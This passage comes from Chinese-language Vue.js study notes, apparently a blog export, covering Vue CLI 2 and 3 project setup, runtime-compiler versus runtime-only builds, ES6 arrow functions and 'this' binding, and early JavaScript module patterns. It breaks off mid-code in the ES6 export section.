跟项目名一样</p></li><li><p>Out:<code>? Project description (A Vue.js project)</code> //项目描述</p><p>In    :<code>test vue cli2</code></p></li><li><p>Out:<code>? Author (piaoliangjiejie2019 &lt;piaoliangjiejie2019@outlook.com&gt;)</code> //全局git</p></li><li><p>Out:<code>Runtime + Compiler: recommended for most users Runtime-only: about 6KB lighter min+gzip, but templates (or any Vue-specific HTML) are ONLY allowed in .vue files - render functions are required elsewhere</code> //询问要用哪个构建项目</p><p>In   :  //选择下面个  打包出的小 运行效率高</p></li><li><p>Out:<code>? Install vue-router? (Y/n) </code>  //是否安装路由 暂时not 因为还没学</p></li><li><p>Out:<code>? Use ESLint to lint your code? (Y/n) </code> //对js的限制 规范代码 if不规范会报错</p><p>In   :<code>y</code></p><p>Out:<code>Standard (https://github.com/standard/standard) Airbnb (https://github.com/airbnb/javascript) none (configure it yourself)</code> //哪个人的规范</p><p>In   : //暂时选标准</p></li><li><p>Out:<code>? Set up unit tests (Y/n) </code>  //单元测试 用的少 n</p></li><li><p>Out:<code>? Setup e2e tests with Nightwatch? (Y/n) </code> //e to e -&gt;end to end 端到端  n</p></li><li><p>Out:<code>? Should we run npm install for you after the project has been created? (recommended) (Use arrow keys)</code></p><p><code>Yes, use NPM Yes, use Yarn No, I will handle that myself </code>  //使用 npm / yarn</p><p>In  : <code>npm</code></p></li></ol><img src='https://s1.328888.xyz/2022/04/09/Xaimv.jpg'><h3 id="1.6-vuecli-cli2目录的解析.">1.6 vuecli-CLI2目录的解析.<a title="#1.6-vuecli-cli2目录的解析." href="#1.6-vuecli-cli2目录的解析."></a></h3><ul><li>node test.js 命令 可以直接在终端输出 控制台的内容</li></ul><img src='https://s1.328888.xyz/2022/04/09/Xaro0.jpg'><h2 id="2.eslint规范和runtime-compiler/only区别">2.ESLint规范和runtime compiler/only区别<a title="#2.eslint规范和runtime-compiler/only区别" href="#2.eslint规范和runtime-compiler/only区别"></a></h2><h3 id="2.1-eslint">2.1 eslint<a title="#2.1-eslint" href="#2.1-eslint"></a></h3><ul><li><p>开了两个项目 01runtimecompiler 装了eslint   02runtimeonly 没装eslint</p><blockquote><p>eslint 有很多奇奇怪怪的标准  保存就会显示报错信息</p></blockquote><blockquote><p>选了后 想关掉eslint ：congif-&gt;index.js-&gt; 26 行的 useEslint 改成 false 然后编译即可</p></blockquote></li></ul><h3 id="2.2-runtime-compiler和only的区别（p96）">2.2 runtime compiler和only的区别（p96）<a title="#2.2-runtime-compiler和only的区别（p96）" href="#2.2-runtime-compiler和only的区别（p96）"></a></h3><ol><li><p>区别只在main.js里</p><ul><li><p>runtime compiler：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* eslint-disable no-new */</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">  <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span><br><span class="line">  <span class="attr">components</span>: &#123; <span class="title class_">App</span> &#125;,</span><br><span class="line">  <span class="attr">template</span>: <span class="string">&#x27;&lt;App/&gt;&#x27;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>runtime only：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* eslint-disable no-new */</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">  <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span><br><span class="line">  <span class="attr">render</span>: <span class="function"><span class="params">h</span> =&gt;</span> <span class="title function_">h</span>(<span class="title class_">App</span>) <span class="comment">// 相当于</span></span><br><span class="line">    <span class="comment">//render:function(h)&#123;return h(App)&#125;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ul></li><li><p>vue运行过程</p><img src='https://s1.328888.xyz/2022/04/09/XaA7F.png' style="zoom:50%;" ></li><li><p>对比：</p><ul><li><p>runtime-compiler ：</p><blockquote><p>template -&gt; ast  -&gt; render -&gt; vdom -&gt; UI</p></blockquote></li><li><p>runtime-only（性能更高，代码量更少）</p><blockquote><p>render -&gt; vdom -&gt;UI</p></blockquote></li><li><p>所以尽量使用 runtime-only</p></li></ul></li><li><p>render 函数 和 createElement函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//runtime-compiler</span></span><br><span class="line"></span><br><span class="line"><span class="attr">render</span>: <span class="keyword">function</span>(<span class="params">createElement</span>) &#123;</span><br><span class="line">        <span class="comment">//1.普通用法： createElement(&#x27;标签&#x27;,&#123;标签的属性&#125;,[&#x27;&#x27;]) </span></span><br><span class="line">        <span class="comment">//返回的东西 会覆盖 #app的内容</span></span><br><span class="line">        <span class="comment">// return createElement(&#x27;h2&#x27;, &#123; class: &#x27;box&#x27; &#125;, [&#x27;hello&#x27;]);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.传入组件对象</span></span><br><span class="line">        <span class="comment">//这样的话 就是直接使用render函数 省去了前两步内容 效率更高</span></span><br><span class="line">        <span class="comment">// return createElement(cpn);</span></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">createElement</span>(<span class="title class_">App</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li><p>在runtime-only main.js 里 App 已经没有包含 template 了</p><blockquote><p>.vue 文件中的template是由 vue-template-compiler ——将.vue文件的template解析成render函数</p></blockquote></li></ul></li><li><p>总结：</p><ul><li>如果之后的开发中 依然使用template，就需要选择runtime-compiler</li><li>如果使用的是.vue文件 就可以选择runtime-only</li></ul></li></ol><h2 id="3.vue-cli3(p97-)">3.Vue CLI3(p97-)<a title="#3.vue-cli3(p97-)" href="#3.vue-cli3(p97-)"></a></h2><h3 id="3.1-vue-cli-3-与-2-的区别">3.1 vue-cli 3 与 2 的区别<a title="#3.1-vue-cli-3-与-2-的区别" href="#3.1-vue-cli-3-与-2-的区别"></a></h3><ul><li>vue-cli 3 是基于webpack 4 打造的，vue-cli 2 还是 webpack 3</li><li>vue-cli 3 的设计是‘0配置’ ，移除的配置文件根目录下的 build和config等目录</li><li>vue-cli 3 提供了vue ui 命令，提供了可视化配置，更加人性化</li><li>移除了static文件夹，新增了public文件夹，并且index.html移动到public中</li></ul><h3 id="3.2-创建项目">3.2 创建项目<a title="#3.2-创建项目" href="#3.2-创建项目"></a></h3><p>In：<code>vue create 03vuecli3test </code></p><p>Out：<code>Vue CLI v4.5.12</code><br><code>? Please pick a preset: (Use arrow keys)</code>   //选择配置<br><code>&gt;Default ([Vue 2] babel, eslint)  //默认2 Default (Vue 3 Preview) ([Vue 3] babel, eslint) //默认3 Manually select features</code>  //手动  √</p><p>Out：  //按空格是 选择 / 取消</p><p><code>(*) Choose Vue version  //后面选3.x  (*) Babel  ( ) TypeScript  ( ) Progressive Web App (PWA) Support  //先进app 可以缓存很多东西 也有推送通知  ( ) Router  ( ) Vuex  ( ) CSS Pre-processors  //css预处理器 if用less什么的就可以选  (*) Linter / Formatter   //eslint  ( ) Unit Testing   //测试  ( ) E2E Testing</code>   //测试</p><p>Out：<code>? Where do you prefer placing config for Babel, ESLint, etc.? (Use arrow keys) </code></p><p><code>In dedicated config files In package.json</code>  //配置文件的存放位置  独立文件 /pack.json  选单独的</p><p>Out：<code>? Save this as a preset for future projects? (y/N)</code> //是否保存配置 会添加到第1个out  y</p><blockquote><p>如果想删掉 在 users/lsy/.vuerc   里面有presets 对象 然后删掉里面的 值就可以了</p></blockquote><p>Out：<code>? Save preset as: </code> //保存的名字  coedrwhy</p><h3 id="3.3-跑项目">3.3 跑项目<a title="#3.3-跑项目" href="#3.3-跑项目"></a></h3><h4 id="3.3.1-cli-2">3.3.1 cli 2<a title="#3.3.1-cli-2" href="#3.3.1-cli-2"></a></h4><img src='https://s1.328888.xyz/2022/04/09/XaHJy.png'><img src='https://s1.328888.xyz/2022/04/09/XaqWk.png'><h4 id="3.3.2-cli3">3.3.2 cli3<a title="#3.3.2-cli3" href="#3.3.2-cli3"></a></h4><p>看package.json  的scripts的东西</p><p>里面是 serve   &amp; build</p><p>所以是 npm run serve 开发/ build 发布</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createApp &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">createApp</span>(<span class="title class_">App</span>).<span class="title function_">mount</span>(<span class="string">&#x27;#app&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//相当于 </span></span><br><span class="line"><span class="comment">// new Vue(&#123;</span></span><br><span class="line"><span class="comment">//     el: &quot;#app&quot;,</span></span><br><span class="line"><span class="comment">//     render: function(h) &#123;</span></span><br><span class="line"><span class="comment">//         return h(App)</span></span><br><span class="line"><span class="comment">//     &#125;</span></span><br><span class="line"><span class="comment">// &#125;)</span></span><br></pre></td></tr></table></figure><h3 id="3.4-vue-cli3配置文件的查看和修改">3.4 Vue-Cli3配置文件的查看和修改<a title="#3.4-vue-cli3配置文件的查看和修改" href="#3.4-vue-cli3配置文件的查看和修改"></a></h3><ul><li><p>UI方向的配置</p><ul><li>启动配置服务器：vue ui  //启动本地服务器 不用进入哪个地址</li><li>导入 刚建的文件夹</li><li>左2 插件 左3 依赖 左4 配置 可以改的 左5 任务 可以各种运行</li></ul></li><li><p>src+文件 vue.config.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span>=&#123;&#125;   <span class="comment">//会跟其他的配置文件合并一起的 放独有的配置</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="4.箭头函数的使用和this的指向问题(p99)">4.箭头函数的使用和this的指向问题(p99)<a title="#4.箭头函数的使用和this的指向问题(p99)" href="#4.箭头函数的使用和this的指向问题(p99)"></a></h2><h3 id="4.1-基本使用">4.1 基本使用<a title="#4.1-基本使用" href="#4.1-基本使用"></a></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.定义函数的方式：function</span></span><br><span class="line"><span class="keyword">const</span> aaa = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//2.对象字面量中定义函数</span></span><br><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">    <span class="attr">bbb</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="title function_">bbb</span>(<span class="params"></span>)&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//3.ES6中的箭头函数</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">ccc</span> = (<span class="params">参数列表</span>) =&gt;&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">aaa</span> = (<span class="params"></span>) =&gt;&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4.2-箭头函数参数和返回值">4.2 箭头函数参数和返回值<a title="#4.2-箭头函数参数和返回值" href="#4.2-箭头函数参数和返回值"></a></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.参数问题</span></span><br><span class="line"><span class="comment">//1.1放入两个参数</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">sum</span> =(<span class="params">num1,num2</span>) =&gt;&#123;</span><br><span class="line">    <span class="keyword">return</span> num1+num2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1.2 放一个参数</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">power</span> = (<span class="params">num</span>) =&gt;&#123;  <span class="comment">//括号可以省略</span></span><br><span class="line">    <span class="keyword">return</span> num*num;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.返回值</span></span><br><span class="line"><span class="comment">//2.1 函数代码块中有多行代码</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">test</span> = (<span class="params"></span>) =&gt;&#123;</span><br><span class="line">    <span class="comment">//1.打印Hello World</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Hello World&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//2.打印Hello Vue</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Hello Vue&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.2 函数代码块中只有一行代码</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">mul</span> = (<span class="params">num1,num2</span>) =&gt;&#123;</span><br><span class="line">    <span class="keyword">return</span> num1+num2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//等同于</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">mul2</span> = (<span class="params">num1,num2</span>) =&gt; num1*num2</span><br><span class="line"></span><br><span class="line"><span class="comment">//无返回值时 自动将结果作为返回值 给demo</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">demo</span> = (<span class="params"></span>) =&gt; <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Hello vue&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="4.3-箭头函数的this的使用">4.3 箭头函数的this的使用<a title="#4.3-箭头函数的this的使用" href="#4.3-箭头函数的this的使用"></a></h3><ul><li>使用箭头函数多：当准备一个函数作为参数传给另一个函数的时候</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>);  <span class="comment">//window</span></span><br><span class="line">&#125;,<span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>); <span class="comment">//window</span></span><br><span class="line">&#125;,<span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//结论：箭头函数中this引用的就是最近作用域中的this</span></span><br><span class="line"><span class="keyword">const</span> obj =&#123;</span><br><span class="line">    <span class="title function_">aaa</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>); <span class="comment">//window</span></span><br><span class="line">        &#125;)</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>); <span class="comment">//obj对象</span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> obj =&#123;</span><br><span class="line">    <span class="title function_">aaa</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>); <span class="comment">//window</span></span><br><span class="line">            &#125;)</span><br><span class="line">            </span><br><span class="line">            <span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>); <span class="comment">//window</span></span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">            <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>); <span class="comment">//window</span></span><br><span class="line">            &#125;)</span><br><span class="line">            </span><br><span class="line">            <span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>); <span class="comment">//obj</span></span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> learningNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vue </tag>
            
            <tag> es6 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>04 vue模块化开发</title>
      <link href="/learningNotes/vue/04%E6%A8%A1%E5%9D%97%E5%8C%96%E5%BC%80%E5%8F%91"/>
      <url>/learningNotes/vue/04%E6%A8%A1%E5%9D%97%E5%8C%96%E5%BC%80%E5%8F%91</url>
      
        <content type="html"><![CDATA[<h2 id="1.什么是模块化">1.什么是模块化<a title="#1.什么是模块化" href="#1.什么是模块化"></a></h2><p>使用模块作为出口：</p><ul><li>在匿名函数内定义一个对象</li><li>给对象添加各种需要暴露到外面的属性和方法（不需要暴露的直接定义即可）</li><li>最后将要暴露的对象返回 并且在外面使用一个moudleB接受</li></ul><p>在main.js使用：</p><ul><li>只需要使用属于自己模块化的属性和方法即可</li></ul><p>这就是模块化最基础的封装，事实上模块的封装还有很多高级的话题：</p><ul><li>以下就是最简单的模块的原始雏形</li><li>目前前端模块化开发已经有了很多既有的规范，以及应对的方案</li></ul><p>常见的模块化规范：</p><ul><li>CommonJS、AMD、CMD、es6的Modules</li></ul><h3 id="1.1-原始的模块化">1.1 原始的模块化<a title="#1.1-原始的模块化" href="#1.1-原始的模块化"></a></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这样在别的文件 又不会产生命名冲突 又可以使用曾经声明过的变量 直接使用moduleB.flag</span></span><br><span class="line"><span class="comment">//早期自己的模块化使用</span></span><br><span class="line"><span class="keyword">var</span> moduleB = (<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">//导出的对象</span></span><br><span class="line">    <span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line">    <span class="keyword">var</span> name = <span class="string">&quot;red&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> flag = <span class="literal">true</span>;</span><br><span class="line">    </span><br><span class="line">    obj.<span class="property">flag</span> = flag;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;())</span><br></pre></td></tr></table></figure><h3 id="1.2-commonjs">1.2 CommonJS<a title="#1.2-commonjs" href="#1.2-commonjs"></a></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//aaa.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> name =<span class="string">&#x27;ming&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> flag = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sum</span>(<span class="params">num1,num2</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> num1+num2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//导出语法  必须要有底层支撑才能解析代码 比如node</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="attr">flag</span>:flag,</span><br><span class="line">    sum</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//mmm.js</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//导入</span></span><br><span class="line"><span class="keyword">var</span> &#123;flag,sum&#125; = <span class="built_in">require</span>(<span class="string">&#x27;./aaa.js&#x27;</span>);  <span class="comment">//对象的解构</span></span><br><span class="line"> <span class="comment">//===</span></span><br><span class="line"><span class="keyword">var</span> aaa = <span class="built_in">require</span>(<span class="string">&#x27;./aaa.js&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> flag = aaa.<span class="property">flag</span>;</span><br><span class="line"><span class="keyword">var</span> sum = aaa.<span class="property">sum</span>;</span><br></pre></td></tr></table></figure><h3 id="1.3-es6的模块化的导入导出">1.3 es6的模块化的导入导出<a title="#1.3-es6的模块化的导入导出" href="#1.3-es6的模块化的导入导出"></a></h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- html 使用type=‘module’就可以 使用模块化 不会出现命名冲突 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&#x27;aaa.js&#x27;</span> <span class="attr">type</span>=<span class="string">&#x27;module&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&#x27;bbb.js&#x27;</span> <span class="attr">type</span>=<span class="string">&#x27;module&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&#x27;mmm.js&#x27;</span> <span class="attr">type</span>=<span class="string">&#x27;module&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//aaa.js</span></span><br><span class="line"><span class="keyword">var</span> name = <span class="string">&#x27;ming&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> age = <span class="number">18</span>;</span><br><span class="line"><span class="keyword">var</span> flag = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sum</span>(<span class="params">num1,num2</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> num1 + num2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(flag)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">sum</span>(<span class="number">20</span>,<span class="number">30</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1.导出方式一：导出给其他js使用本js的变量</span></span><br><span class="line"><span class="keyword">export</span>&#123;</span><br><span class="line">flag,sum</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//2.导出方式二：定义时就导出变量</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">var</span> num1 = <span class="number">1000</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">var</span> height =  <span class="number">1.88</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//3.导出函数/类</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">mul</span>(<span class="params">num1,num2</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> num1+num2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="title function_">run</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span 